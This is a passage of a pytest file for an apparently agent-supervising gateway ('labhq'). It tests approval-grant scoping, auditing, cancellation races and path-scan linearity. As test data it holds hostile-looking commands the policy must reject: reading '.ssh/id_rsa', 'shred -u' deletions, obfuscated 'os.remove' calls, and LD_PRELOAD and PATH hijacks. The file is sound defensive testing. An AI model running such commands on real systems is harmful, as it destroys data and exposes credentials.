import ast
import itertools
import ntpath
import os
import posixpath
import time
from pathlib import Path
from types import SimpleNamespace

import pytest
import yaml

from labhq import policy as policy_module
from labhq.policy import (
    claude_rule_path, claude_settings, core_hours, evaluate_tool, hpc_needs_approval,
    mentions_zone, touches, touches_resolved,
)
from labhq.settings import DataZone, PolicySettings, Settings


def _policy(**kw):
    return PolicySettings(data_zones=[DataZone(path="/data/cohort", level="restricted")], **kw)


@pytest.mark.parametrize("tail", ["sbatch job.sh", "curl https://example.test", "rm /tmp/a",
                                  "cat a > /outside/result"])
def test_request_grant_excludes_mixed_internal_commands(tail):
    from labhq.approval_grants import classify

    policy = PolicySettings(data_zones=[DataZone(path="/data/internal", level="internal")])
    command = {"command": f"cat /data/internal/a; {tail}"}
    assert evaluate_tool("Bash", command, policy, ["/work"], "/work").action == "ask"
    assert classify("Bash", command, policy, workdir="/work") is None


def test_request_grant_category_uses_runner_policy(tmp_path, monkeypatch):
    from labhq.approval_grants import classify
    monkeypatch.setattr("labhq.workspace_commands._resolve_executable", lambda *a: (True, "test"))

    internal = tmp_path / "internal"
    internal.mkdir()
    policy = PolicySettings(data_zones=[DataZone(path=internal.as_posix(), level="internal")])
    assert classify("Bash", {"command": f'cat "{internal.as_posix()}/a"'}, policy,
                    workdir=tmp_path.as_posix()) == "internal_read"
    assert classify("Bash", {"command": "echo harmless"}, policy, workdir=tmp_path.as_posix()) is None
    assert classify("Read", {"file_path": internal.as_posix()}, policy, workdir=tmp_path.as_posix()) is None


def test_request_grant_parent_private_path_preserves_exclusions(tmp_path, monkeypatch):
    from labhq.approval_grants import classify
    monkeypatch.setattr("labhq.workspace_commands._resolve_executable", lambda *a: (True, "test"))

    policy = PolicySettings()
    work = tmp_path / "work"
    work.mkdir()
    def category(cmd):
        return classify("Bash", {"command": cmd}, policy, workdir=work.as_posix(),
                        private_paths=(tmp_path.as_posix(),), private_enabled=True)

    # Already allowed by the ordinary policy, so there is no grant card.
    assert category(f'cat "{work.as_posix()}/a"') is None
    assert category(f'cat "{tmp_path.as_posix()}/secret/a"') is None
    assert category("cat a > ../secret/out") is None
    assert category("cat .ssh/id_rsa") is None
    assert category("cat $HOME/secret/a") is None
    assert category("python -c x") == "unresolved_path"


def test_request_grant_cd_write_scope(tmp_path):
    from labhq.approval_grants import classify

    work = tmp_path / "work"
    nested = work / "nested"
    nested.mkdir(parents=True)
    policy = PolicySettings()

    def category(command):
        return classify("Bash", {"command": command}, policy, workdir=work.as_posix(),
                        private_paths=(tmp_path.as_posix(),), private_enabled=True)

    assert category(f'cd "{nested.as_posix()}" && echo x > output.txt') == "workspace"
    assert category(f'cd "{nested.as_posix()}" && echo x > ../../outside.txt') is None
    assert category('cd "$UNKNOWN" && echo x > output.txt') is None


@pytest.fixture
def request_grant_hub(tmp_path, monkeypatch):
    from labhq.gateway.server import Hub
    from labhq.store import StateStore

    hub = Hub.__new__(Hub)
    hub.store = StateStore(tmp_path / "grants.sqlite3")
    hub.requests = {"r1": {"status": "running"}, "r2": {"status": "running"}}
    for rid, request in hub.requests.items():
        hub.store.put("request", rid, request)
    hub.runners = {"runner": object()}
    hub.runner_processes = {"runner": "process-1"}
    hub.runner_incarnations = {"runner": "inc-1"}
    hub.runner_capabilities = {"runner": {"approval_grants": 1}}
    hub.approvals, hub.recruits_running = {}, {}
    hub.store.put("task", "t1", {"request_id": "r1", "runner_id": "runner", "payload": {"agent_id": "agent"}})
    events, sent = [], []
    async def publish(event, **kwargs):
        events.append(event)
    async def send(runner, message):
        sent.append(message)
    monkeypatch.setattr(hub, "publish", publish)
    monkeypatch.setattr(hub, "send_runner", send)
    monkeypatch.setattr(hub, "_cancel_facilities_timeout", lambda aid: None)
    monkeypatch.setattr(hub, "_cancel_resume_timer", lambda aid: None)
    yield hub, events, sent
    hub.store.close()


def _grant_card(aid, rid="r1", category="workspace"):
    return {"id": aid, "kind": "tool_permission", "summary": "example", "request_id": rid,
            "task_id": "t1", "agent_id": "agent",
            "detail": {"grant_category": category, "grant_process": "process-1"}}


async def _receive_grant_card(hub, card):
    await hub._on_runner_message("runner", {"type": "approval.requested", "data": card,
        "request_id": card["request_id"], "task_id": card["task_id"], "agent_id": card["agent_id"]})


async def test_request_grant_is_explicit_audited_and_scoped(request_grant_hub):
    hub, events, sent = request_grant_hub
    await _receive_grant_card(hub, _grant_card("first"))
    assert "first" in hub.approvals and not sent
    await hub.resolve_approval("first", True, grant_for_request=True)
    assert hub.store.get("approval_grants", "r1") == {"workspace": "first"}
    await _receive_grant_card(hub, _grant_card("second"))
    decision = hub.store.get("approval_decision", "second")
    assert decision["automatic"] is True and decision["grant_source"] == "first"
    assert events[-1]["type"] == "approval.resolved" and events[-1]["data"]["grant_source"] == "first"
    assert sent[-1]["approved"] is True
    await _receive_grant_card(hub, _grant_card("other-category", category="internal_read"))
    assert "other-category" in hub.approvals
    hub.store.put("task", "t1", {"request_id": "r2", "runner_id": "runner", "payload": {"agent_id": "agent"}})
    await _receive_grant_card(hub, _grant_card("other-request", rid="r2"))
    assert "other-request" in hub.approvals


@pytest.mark.parametrize("change", ["wrong_task", "wrong_process", "unsupported", "not_approved", "cancelled"])
async def test_request_grant_rejects_untrusted_or_inactive_card(request_grant_hub, change):
    hub, _, _ = request_grant_hub
    card = _grant_card("invalid")
    if change == "wrong_task":
        card["request_id"] = "r2"
    elif change == "wrong_process":
        card["detail"]["grant_process"] = "forged"
    elif change == "unsupported":
        card["detail"]["grant_category"] = "scheduler"
    elif change == "cancelled":
        hub.requests["r1"]["status"] = "cancelled"
    entry = {"approval": card, "origin": "runner", "origin_process": "process-1"}
    hub.approvals["invalid"] = entry
    hub.save_approval("invalid")
    with pytest.raises(ValueError):
        await hub.resolve_approval("invalid", change != "not_approved", grant_for_request=True)
    assert hub.store.get("approval_grants", card["request_id"]) is None


@pytest.mark.parametrize("status", ["done", "failed", "cancelled", "review_pending", "interrupted"])
def test_request_grant_removed_on_end_and_not_restored(request_grant_hub, status):
    hub, _, _ = request_grant_hub
    hub.store.put("approval_grants", "r1", {"workspace": "first"})
    hub.store.put("request", "r1", {"status": status})
    assert hub.store.get("approval_grants", "r1") is None
    hub.store.put("request", "r1", {"status": "running"})
    assert hub.store.get("approval_grants", "r1") is None


async def test_request_grant_commit_and_cancellation_are_serialized(request_grant_hub, monkeypatch):
    import asyncio
    import threading
    from contextlib import contextmanager
    hub, _, sent = request_grant_hub
    entered, release = threading.Event(), threading.Event()
    async def save(rid):
        await hub.store.aput("request", rid, hub.requests[rid])
    async def no_cancel(tid):
        return False
    async def silent(*args):
        return []
    async def finish(rid):
        return None
    monkeypatch.setattr(hub, "asave_request", save)
    monkeypatch.setattr(hub, "cancel_task", no_cancel)
    monkeypatch.setattr(hub, "_await_cancelled_results", silent)
    monkeypatch.setattr(hub, "_afinish_cancel", finish)
    monkeypatch.setattr(hub, "_restore_unstarted_continuation", lambda *args: None)
    hub.request_tasks, hub.jobs_waiters = {}, {}
    hub.orchestrator = SimpleNamespace(cancel_steps=lambda rid: [])
    await _receive_grant_card(hub, _grant_card("racing"))
    transaction = hub.store._transaction
    first = True
    @contextmanager
    def hold():
        nonlocal first
        with transaction() as conn:
            yield conn
            if first:
                first = False
                entered.set()
                if not release.wait(5):
                    raise TimeoutError("test barrier")
    monkeypatch.setattr(hub.store, "_transaction", hold)
    approving = asyncio.create_task(hub.resolve_approval("racing", True, grant_for_request=True))
    while not entered.is_set():
        await asyncio.sleep(0.001)
    cancelling = asyncio.create_task(hub.cancel_request("r1"))
    await asyncio.sleep(0)
    assert hub.requests["r1"]["status"] == "cancelled"
    release.set()
    await approving
    await cancelling
    assert hub.requests["r1"]["status"] == "cancelled"
    assert hub.store.get("approval_grants", "r1") is None
    assert hub.store.get("approval_decision", "racing")["approved"] is False
    assert sent[-1]["approved"] is False


async def test_request_grant_is_atomic_when_storage_fails(request_grant_hub, monkeypatch):
    from contextlib import contextmanager
    hub, _, _ = request_grant_hub
    await _receive_grant_card(hub, _grant_card("storage-failure"))
    transaction = hub.store._transaction
    @contextmanager
    def fail():
        with transaction() as conn:
            yield conn
            raise OSError("injected failure")
    monkeypatch.setattr(hub.store, "_transaction", fail)
    with pytest.raises(OSError, match="injected failure"):
        await hub.resolve_approval("storage-failure", True, grant_for_request=True)
    assert hub.store.get("approval_grants", "r1") is None
    assert hub.store.get("approval_decision", "storage-failure") is None
    assert "storage-failure" in hub.approvals


async def test_request_grant_api_requires_explicit_selection(tmp_path, monkeypatch):
    import httpx
    from labhq.gateway.server import create_app
    settings = Settings()
    settings.gateway.state_dir = str(tmp_path / "state")
    settings.gateway.client_token = "test-token"
    app = create_app(settings)
    hub = app.state.hub
    hub.requests["r1"] = {"status": "running"}
    hub.store.put("request", "r1", hub.requests["r1"])
    hub.store.put("task", "t1", {"request_id": "r1", "runner_id": "runner", "payload": {"agent_id": "agent"}})
    hub.runners["runner"] = object()
    hub.runner_processes["runner"] = "process-1"
    hub.runner_incarnations["runner"] = "inc-1"
    hub.runner_capabilities["runner"] = {"approval_grants": 1}
    async def publish(event, **kwargs):
        pass
    async def send(*args):
        pass
    monkeypatch.setattr(hub, "publish", publish)
    monkeypatch.setattr(hub, "send_runner", send)
    await _receive_grant_card(hub, _grant_card("api-one"))
    await _receive_grant_card(hub, _grant_card("api-two"))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
        assert (await client.post("/api/approvals/api-one", json={"approved": True})).status_code == 401
        client.headers["Authorization"] = "Bearer test-token"
        assert (await client.post("/api/approvals/api-one", json={"approved": True})).status_code == 200
        assert hub.store.get("approval_grants", "r1") is None
        assert (await client.post("/api/approvals/api-two", json={"approved": False,
                                  "grant_for_request": True})).status_code == 422
        assert (await client.post("/api/approvals/api-two", json={"approved": True,
                                  "grant_for_request": True})).status_code == 200
        assert hub.store.get("approval_grants", "r1") == {"workspace": "api-two"}
    hub.store.close()


async def test_request_approval_summary_counts_all_confirmed_and_survives_restart(tmp_path):
    import httpx
    from labhq.gateway.server import create_app
    from labhq.store import StateStore

    settings = Settings()
    settings.gateway.state_dir = str(tmp_path / "state")
    settings.gateway.client_token = "test-token"
    app = create_app(settings)
    hub = app.state.hub
    hub.requests["r1"] = {"status": "running"}
    hub.store.put("request", "r1", hub.requests["r1"])
    manual = {"approval": {"request_id": "r1"}, "approved": True,
              "automatic": False, "grant_category": "workspace", "grant_source": "source"}
    hub.store.put("approval_decision", "source", manual)
    hub.store.put("approval_grants", "r1", {"workspace": "source"})
    for i in range(205):
        hub.store.put("approval_decision", f"auto-{i}", {"approval": {"request_id": "r1"},
                      "approved": True, "automatic": True})
    hub.store.put("approval_decision", "auto-0", {"approval": {"request_id": "r1"},
                  "approved": True, "automatic": True})  # replay overwrites the same ID
    for aid, decision in {
        "pending": {"approval": {"request_id": "r1"}, "approved": True, "automatic": True, "grant_pending": True},
        "rejected": {"approval": {"request_id": "r1"}, "approved": False, "automatic": True},
        "other": {"approval": {"request_id": "r2"}, "approved": True, "automatic": True},
    }.items():
        hub.store.put("approval_decision", aid, decision)
    expected = {"request_id": "r1", "automatic_approved_count": 205,
                "granted_categories": ["workspace"], "active_grant_categories": ["workspace"]}
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
        assert (await client.get("/api/requests/r1/approval-summary")).status_code == 401
        client.headers["Authorization"] = "Bearer test-token"
        assert (await client.get("/api/requests/missing/approval-summary")).status_code == 404
        assert (await client.get("/api/requests/r1/approval-summary")).json() == expected
        hub.store.put("request", "r1", {"status": "cancelled"})
        expected["active_grant_categories"] = []
        assert (await client.get("/api/requests/r1/approval-summary")).json() == expected
        db = hub.store.path
        hub.store.close()
        hub.store = StateStore(db)
        assert (await client.get("/api/requests/r1/approval-summary")).json() == expected
    hub.store.close()


async def test_request_grant_runner_rejects_forged_classification(tmp_path, monkeypatch):
    from labhq.models import ApprovalRequest, Engine
    from labhq.runner.daemon import Runner
    runner = Runner.__new__(Runner)
    runner.s = Settings()
    runner.s.policy.data_zones = [DataZone(path="/data/internal", level="internal")]
    runner.process = "process-1"
    agent = SimpleNamespace(engine=Engine.claude_code, name="test", permission_mode="default")
    task = SimpleNamespace(meta={}, agent_id="agent")
    runner.workspaces = {"t1": SimpleNamespace(dir=tmp_path, task=task, agent=agent)}
    runner.task_req, runner.active_roots = {"t1": "r1"}, {"t1": (False, [tmp_path])}
    runner.tool_contexts = {"t1": SimpleNamespace(agent=agent, extra_dirs=[], private_paths=[],
        private_enabled=False, private_open_reads=[], read_only=False, shared_environment_protected=False,
        environment_step=False, env={})}
    runner.approval_tasks = {}
    emitted = []
    async def emit(events):
        emitted.extend(events)
    runner.emit_all = emit
    req = ApprovalRequest(kind="tool_permission", summary="claimed safe", task_id="t1", request_id="r1",
        agent_id="agent", detail={"tool_name": "Bash", "tool_input": {"command": "cat /data/internal/a; sbatch job.sh"},
                                  "policy_reason": "safe", "grant_category": "workspace", "grant_process": "process-1"})
    await runner._on_approval(req)
    assert "grant_category" not in req.detail and "grant_process" not in req.detail
    assert emitted[0].type == "approval.requested"


@pytest.mark.parametrize("method", ["commit_terminal", "commit_request_event"])
def test_request_grant_expires_with_terminal_event_commit(request_grant_hub, method):
    hub, _, _ = request_grant_hub
    hub.store.put("approval_grants", "r1", {"workspace": "first"})
    getattr(hub.store, method)("r1", {"status": "done"},
                               {"type": "request.completed", "request_id": "r1", "data": {}}, 100)
    assert hub.store.get("approval_grants", "r1") is None
    assert hub.store.get("request", "r1")["status"] == "done"


async def test_request_grant_pending_delivery_is_denied_after_end(request_grant_hub):
    hub, _, sent = request_grant_hub
    await _receive_grant_card(hub, _grant_card("first"))
    await hub.resolve_approval("first", True, grant_for_request=True)
    await _receive_grant_card(hub, _grant_card("automatic"))
    assert hub.store.get("approval_decision", "automatic")["approved"] is True
    hub.requests["r1"]["status"] = "cancelled"
    hub.store.put("request", "r1", hub.requests["r1"])
    for aid in ("first", "automatic"):
        await hub._send_decision("runner", aid)
        assert sent[-1]["approved"] is False
        assert hub.store.get("decision", aid)["approved"] is False
        recorded = hub.store.get("approval_decision", aid)
        assert recorded["approved"] is False and recorded["note"] == "request ended"
    assert hub.store.get("approval_decision", "automatic")["grant_source"] == "first"


async def test_request_grant_card_arriving_during_cancel_is_closed(request_grant_hub, monkeypatch):
    hub, events, sent = request_grant_hub
    hub.store.put("approval_grants", "r1", {"workspace": "first"})
    add = hub._add_approval
    async def cancel_during_add(aid, entry):
        added = await add(aid, entry)
        hub.requests["r1"]["status"] = "cancelled"
        return added
    monkeypatch.setattr(hub, "_add_approval", cancel_during_add)
    await _receive_grant_card(hub, _grant_card("late"))
    assert "late" not in hub.approvals
    assert sent[-1]["approved"] is False
    assert events[-1]["type"] == "approval.expired"


async def test_request_grant_unfinished_commit_fails_closed_on_replay(request_grant_hub, monkeypatch):
    hub, _, sent = request_grant_hub
    await _receive_grant_card(hub, _grant_card("unfinished"))
    async def fail_finalize(*args):
        raise OSError("gateway stopped before grant finalization")
    monkeypatch.setattr(hub.store, "afinalize_grant_approval", fail_finalize)
    with pytest.raises(OSError):
        await hub.resolve_approval("unfinished", True, grant_for_request=True)
    assert hub.store.get("approval_decision", "unfinished")["grant_pending"] is True
    assert not hub._grant_ready("r1", "workspace")
    await _receive_grant_card(hub, _grant_card("after-restart"))
    assert "after-restart" in hub.approvals
    await hub._send_decision("runner", "unfinished")
    assert sent[-1]["approved"] is False
    assert hub.store.get("approval_decision", "unfinished")["approved"] is False
    assert hub.store.get("approval_grants", "r1") is None


async def test_request_grant_from_runner_to_gateway(request_grant_hub, tmp_path, monkeypatch):
    from labhq.models import ApprovalRequest, Engine
    from labhq.runner.daemon import Runner
    from labhq.adapters import get_adapter
    from labhq.approval_grants import capture_staff_env
    from labhq.workspace_commands import _resolve_executable
    # Establish a known baseline; CI's setup-python may set LD_LIBRARY_PATH.
    # The test below separately injects and checks every guarded variable.
    for key in list(os.environ):
        name = key.casefold()
        if (name in {"bash_env", "env", "cdpath", "libpath", "shlib_path", "gconv_path", "locpath"}
                or name.startswith(("bash_func_", "ld_", "dyld_"))):
            monkeypatch.delenv(key, raising=False)
    capture_staff_env(object())  # An adapter without this capability must still run.
    monkeypatch.setattr("labhq.workspace_commands._resolve_executable", lambda *a: (True, "test"))
    hub, events, sent = request_grant_hub
    internal = tmp_path / "internal"
    internal.mkdir()
    runner = Runner.__new__(Runner)
    runner.s = Settings()
    runner.s.policy.data_zones = [DataZone(path=internal.as_posix(), level="internal")]
    runner.process = "process-1"
    agent = SimpleNamespace(engine=Engine.claude_code, name="test", permission_mode="default")
    task = SimpleNamespace(meta={}, agent_id="agent")
    runner.workspaces = {"t1": SimpleNamespace(dir=tmp_path, task=task, agent=agent)}
    runner.task_req, runner.active_roots = {"t1": "r1"}, {"t1": (False, [tmp_path])}
    runner.tool_contexts = {"t1": SimpleNamespace(agent=agent, extra_dirs=[], private_paths=[],
        private_enabled=False, private_open_reads=[], read_only=False, shared_environment_protected=False,
        environment_step=False, env={})}
    adapter = get_adapter(Engine.claude_code, runner.s)
    capture_staff_env(adapter)
    adapter.staff_env(runner.tool_contexts["t1"])
    runner.approval_tasks = {}
    async def emit(frames):
        for frame in frames:
            if frame.type == "approval.requested":
                await hub._on_runner_message("runner", frame.model_dump(mode="json"))
    runner.emit_all = emit
    def card(aid):
        return ApprovalRequest(id=aid, kind="tool_permission", summary="internal read", task_id="t1",
            request_id="r1", agent_id="agent", detail={"tool_name": "Bash",
            "tool_input": {"command": f'cat "{internal.as_posix()}/a"'}, "policy_reason": "ignored"})
    first = card("runner-first")
    await runner._on_approval(first)
    assert first.detail["grant_category"] == "internal_read"
    await hub.resolve_approval(first.id, True, grant_for_request=True)
    second = card("runner-second")
    await runner._on_approval(second)
    assert hub.store.get("approval_decision", second.id)["grant_source"] == first.id
    assert sent[-1]["approved"] is True and events[-1]["data"]["automatic"] is True

    for i, command in enumerate([
        f'python script.py "{internal.as_posix()}/a"',
        f'python -c "print(1)" "{internal.as_posix()}/a"',
        f'python - "{internal.as_posix()}/a" <<\'PY\'\nprint(1)\nPY',
    ]):
        script = card(f"analysis-{i}")
        script.detail["tool_input"]["command"] = command
        await runner._on_approval(script)
        assert hub.store.get("approval_decision", script.id)["grant_source"] == first.id

    for i, command in enumerate([
        f'python -c "import os; os.remove(\'a\')" "{internal.as_posix()}/a"',
        f'unlink "{internal.as_posix()}/a"', f'shred -u "{internal.as_posix()}/a"',
    ]):
        deleting = card(f"visible-delete-{i}")
        deleting.detail["tool_input"]["command"] = command
        await runner._on_approval(deleting)
        assert "grant_category" not in deleting.detail
        assert deleting.id in hub.approvals

    (internal / "sub").mkdir()
    safe_cd = card("safe-cd")
    safe_cd.detail["tool_input"]["command"] = "cd internal/sub && cat a"
    await runner._on_approval(safe_cd)
    assert hub.store.get("approval_decision", safe_cd.id)["grant_source"] == first.id
    (tmp_path / "-").mkdir()
    special_cd = card("unsafe-oldpwd")
    special_cd.detail["tool_input"]["command"] = "cd - && cat internal/a"
    await runner._on_approval(special_cd)
    assert not special_cd.detail.get("grant_category")
    assert hub.store.get("approval_decision", special_cd.id) is None
    assert special_cd.id in hub.approvals
    runner.tool_contexts["t1"].env["CDPATH"] = str(tmp_path / "other")
    adapter.staff_env(runner.tool_contexts["t1"])
    unsafe_cd = card("unsafe-cdpath")
    unsafe_cd.detail["tool_input"]["command"] = "cd internal/sub && cat a"
    await runner._on_approval(unsafe_cd)
    assert not unsafe_cd.detail.get("grant_category")
    assert hub.store.get("approval_decision", unsafe_cd.id) is None
    assert unsafe_cd.id in hub.approvals
    runner.tool_contexts["t1"].env.clear()
    for name in ("LD_PRELOAD", "LD_AUDIT", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "GCONV_PATH", "LOCPATH"):
        runner.tool_contexts["t1"].env[name] = str(tmp_path / "not-loaded")
        adapter.staff_env(runner.tool_contexts["t1"])
        loader_card = card("unsafe-" + name)
        await runner._on_approval(loader_card)
        assert not loader_card.detail.get("grant_category")
        assert hub.store.get("approval_decision", loader_card.id) is None
        assert loader_card.id in hub.approvals
        runner.tool_contexts["t1"].env.clear()

    # A task-supplied PATH must reach both policy and executable verification;
    # a trusted runner PATH cannot validate a different staff executable.
    fake_bin = tmp_path / "fake-bin"
    fake_bin.mkdir()
    fake_cat = fake_bin / ("cat.exe" if os.name == "nt" else "cat")
    fake_cat.write_text("not executed", encoding="utf8")
    fake_cat.chmod(0o755)
    runner.tool_contexts["t1"].env["PATH"] = str(fake_bin)
    adapter.staff_env(runner.tool_contexts["t1"])
    monkeypatch.setattr("labhq.workspace_commands._resolve_executable", _resolve_executable)
    unsafe_path = card("unsafe-path")
    await runner._on_approval(unsafe_path)
    assert not unsafe_path.detail.get("grant_category")
    assert hub.store.get("approval_decision", unsafe_path.id) is None
    assert unsafe_path.id in hub.approvals
    runner.tool_contexts["t1"].env.clear()
    runner.s.engines.claude_code.env["PATH"] = str(fake_bin)
    adapter.staff_env(runner.tool_contexts["t1"])
    unsafe_engine = card("unsafe-engine-path")
    await runner._on_approval(unsafe_engine)
    assert not unsafe_engine.detail.get("grant_category")
    assert hub.store.get("approval_decision", unsafe_engine.id) is None
    assert unsafe_engine.id in hub.approvals
    del runner.tool_contexts["t1"]._approval_grant_env
    missing_env = card("missing-spawn-env")
    await runner._on_approval(missing_env)
    assert not missing_env.detail.get("grant_category")
    assert hub.store.get("approval_decision", missing_env.id) is None
    assert missing_env.id in hub.approvals

    for i, command in enumerate([
        "unlink a", "shred -u a", "python -c 'import os; os.remove(\"a\")'",
        "python -c 'from os import remove as r; r(\"a\")'",
        "python -c 'import os; getattr(os, \"remove\")(\"a\")'", "python script.py",
        "bash -c 'cat a'", "cat $(echo a)", "cat a; unlink a",
    ]):
        unsafe = card(f"unsafe-{i}")
        unsafe.detail["tool_input"]["command"] = command
        await runner._on_approval(unsafe)
        assert not unsafe.detail.get("grant_category")
        assert hub.store.get("approval_decision", unsafe.id) is None
        assert unsafe.id in hub.approvals


def _long_separator_runs(fraction=1):
    return "/" * int(65_536 * fraction) + "\\" * int(65_536 * fraction) + ":" * int(600_000 * fraction)


# A scan that retries at every delimiter of a run costs the square of the run length. The contract is relative, on
# the calling thread: the full input may cost at most _MAX_SCALE times the same composition at a quarter of its
# length. A linear scan costs about 4x; a quadratic one about 16x. On Linux this contract exposed a real quadratic
# step (run 39849219342: 11.2x and 10.2x): `_norm` handed the 131,072-character separator candidate to CPython's
# pure-Python `ntpath.normpath`, which deletes empty components from a list one by one. Windows' native normpath
# hid it, so `_windows_normpath` now applies the same rules in one pass on every host. This checks these inputs
# only; it is not a proof of linearity for every input, and a quadratic regression of the full input would still
# run long before failing.
_MAX_SCALE = 8
_BLOCK_S = 0.1  # a sample is a block of calls of at least this much CPU, so a 15.6 ms Windows clock tick stays below 16 %
_MIN_SAMPLES = 3  # a single slow block cannot decide a side
_MAX_BLOCK_CALLS = {"quarter": 16, "full": 4}  # bounds the work of one block: at most 12 full-input calls per scan
_CLOCK_TICK_S = 0.0157  # the coarsest thread_time tick in use (Windows 15.6 ms): one tick of slack per average


def _costs(call, texts, vary=True):
    """Calling-thread CPU per call for each input, and every result. A sample is a block of calls, which keeps a coarse
    clock from reading 0 for a cheap call; the fastest block counts, since a stall on a loaded CI runner only adds time
    (run 41078175471 read 15.5x from one slow call, where this input costs about 4x) while a quadratic scan is slow in
    every block. Blocks alternate between the sizes so one stall cannot hit one side only (run 41079954051: 9.1x)."""
    samples = {name: [] for name in texts}
    results = {name: [] for name in texts}
    while any(len(values) < _MIN_SAMPLES for values in samples.values()):
        for name, text in texts.items():
            if len(samples[name]) >= _MIN_SAMPLES:
                continue
            spent, calls = 0.0, 0
            while calls < _MAX_BLOCK_CALLS[name] and spent < _BLOCK_S:
                # A fresh text of the same size each call, so a scan that is slow only the first time it sees a text
                # (a cache, a warm-up) is measured at its cold cost every time.
                fresh = f"{text} {'a' * (len(results[name]) + 1)}" if vary else text
                started = time.thread_time()  # this thread only: other threads in a test worker do not count
                results[name].append(call(fresh))
                spent += time.thread_time() - started
                calls += 1
            samples[name].append(spent / calls)
    return {name: min(values) for name, values in samples.items()}, results


def _assert_linear(call, build=_long_separator_runs, expected=None, vary=True):
    cost, results = _costs(call, {"quarter": build(0.25), "full": build(1)}, vary)
    quarter_cost, full_cost = cost["quarter"], cost["full"]
    assert all(result == expected for values in results.values() for result in values), \
        "the scan must keep its result"
    assert full_cost <= _MAX_SCALE * quarter_cost + _CLOCK_TICK_S, (
        f"path scanning must stay linear in the text length: a 4x input cost {full_cost / max(quarter_cost, 1e-9):.1f}x"
        f" ({quarter_cost:.4f} s -> {full_cost:.4f} s per call)")


@pytest.mark.parametrize("quarter_s,full_s,result,reject,expected_calls", [
    (0.125, 0.5, None, False, {"quarter": 3, "full": 3}),      # linear: 4x
    (0.125, 1.0, None, False, {"quarter": 3, "full": 3}),      # the bound itself
    (0.125, 2.0, None, True, {"quarter": 3, "full": 3}),       # quadratic: 16x
    (0.125, 1.0625, None, True, {"quarter": 3, "full": 3}),
    (0.125, 0.5, False, True, {"quarter": 3, "full": 3}),      # wrong result: separator runs name no path
    (0.0078125, 0.03125, None, False, {"quarter": 39, "full": 12}),  # fast machine: blocks of calls, then the fastest
    (0.0, 0.0078125, None, False, {"quarter": 48, "full": 12}),  # quarter below one clock tick: one tick of slack
    (0.0, 0.03125, None, True, {"quarter": 48, "full": 12}),     # but not more than one tick
])
def test_linear_scan_budget_uses_cpu_and_preserves_result_and_strict_limit(
        monkeypatch, quarter_s, full_s, result, reject, expected_calls):
    clock, calls = [0.0], {"quarter": 0, "full": 0}
    # Replace only this module's time object; pytest's real clocks stay intact.
    monkeypatch.setitem(globals(), "time", SimpleNamespace(thread_time=lambda: clock[0]))
    full_text, quarter_text = _long_separator_runs(), _long_separator_runs(0.25)
    assert len(full_text) == 731_072 and len(quarter_text) * 4 == len(full_text)  # the full CI input is kept

    def scan(text):
        size = "full" if len(text) > len(full_text) // 2 else "quarter"
        assert text.startswith((full_text, quarter_text))
        calls[size] += 1
        clock[0] += full_s if size == "full" else quarter_s
        return result

    if reject:
        with pytest.raises(AssertionError):
            _assert_linear(scan)
    else:
        _assert_linear(scan)
    assert calls == expected_calls  # the full input is always scanned, and never more than the bound


@pytest.mark.parametrize("quarter_costs,full_costs,reject", [
    ([0.125] * 3, [3.0, 0.5, 0.5], False),             # one stalled full call (the CI failure): the fastest decides
    ([0.5, 0.125, 0.125], [0.5, 0.5, 0.5], False),     # one stalled quarter call
    ([0.125] * 3, [2.0, 2.5, 2.0], True),              # quadratic: every full call is about 16x
    ([0.125] * 3, [1.4, 2.0, 1.5], True),              # all full calls are over the bound
])
def test_linear_scan_budget_ignores_one_stalled_call_but_not_a_slow_scan(
        monkeypatch, quarter_costs, full_costs, reject):
    clock, queue = [0.0], {"quarter": list(quarter_costs), "full": list(full_costs)}
    monkeypatch.setitem(globals(), "time", SimpleNamespace(thread_time=lambda: clock[0]))
    full_text, quarter_text = _long_separator_runs(), _long_separator_runs(0.25)

    def scan(text):
        clock[0] += queue["full" if len(text) > len(full_text) // 2 else "quarter"].pop(0)
        return None

    if reject:
        with pytest.raises(AssertionError):
            _assert_linear(scan)
    else:
        _assert_linear(scan)


def test_linear_scan_budget_still_rejects_a_really_quadratic_scan():
    """The fastest-call estimate must keep its power: real CPU, work growing with the square of the text length."""
    def quadratic(text):
        n = len(text) // 150
        return sum(sum(range(n)) for _ in range(n)) and None

    with pytest.raises(AssertionError, match="must stay linear"):
        _assert_linear(quadratic)


def test_linear_scan_budget_still_rejects_a_scan_that_is_slow_only_the_first_time():
    """A cache or warm-up must not hide a cold quadratic cost behind a fast repeat of the same input."""
    seen = set()

    def quadratic_once(text):
        if text in seen:
            return None
        seen.add(text)
        n = len(text) // 150
        return sum(sum(range(n)) for _ in range(n)) and None

    with pytest.raises(AssertionError, match="must stay linear"):
        _assert_linear(quadratic_once)


@pytest.mark.parametrize("tail,found", [
    ("/restricted/late.cram", True),
    (" /restricted/late.cram", True),
    ("file:///%72estricted/late.cram", True),
    ("/restricted2/public.txt", False),
    ("https://public.invalid/restricted/guide", False),
])
def test_separator_runs_never_hide_a_late_restricted_path_or_file_uri(tail, found):
    text = _long_separator_runs() + tail
    assert mentions_zone(text, ["/restricted"]) is found
    assert touches({"command": text}, ["/restricted"]) == ("/restricted" if found else None)


def _stdlib_pure_ntpath_normpath():
    """The running CPython's pure-Python `ntpath.normpath`: what Linux runs; Windows normally uses a native one."""
    tree = ast.parse(Path(ntpath.__file__).read_text(encoding="utf-8"))
    node = next(n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef) and n.name == "normpath")
    scope = dict(vars(ntpath))
    exec(compile(ast.Module(body=[node], type_ignores=[]), ntpath.__file__, "exec"), scope)
    return scope["normpath"]


def test_windows_normpath_keeps_the_running_stdlib_rules():
    pure = _stdlib_pure_ntpath_normpath()
    cases = ["".join(chars) for n in range(5) for chars in itertools.product("\\/.aC:?", repeat=n)]
    cases += [r"\\server\share\a\..\..\b", "//server/share/../x", r"\\.\C:\a\..\b", "//./C:/a/../b", r"\\?\C:\a\..\b",
              "//?/C:/a/../b", r"\\?\UNC\server\share\x\..\y", "C:a\\..\\..\\b", "C:\\..\\..\\b", "C:/Users/x/./y//z/../w",
              "C:/Restricted/./Data//x/../y", r"\\server", r"\\server\share", "\\..\\a", "..\\..\\a", ".", ".."]
    assert [policy_module._windows_normpath(case) for case in cases] == [pure(case) for case in cases]


@pytest.mark.parametrize("build", [
    lambda f: "/" * int(65_536 * f) + "\\" * int(65_536 * f) + "x",       # the scanner's separator candidate
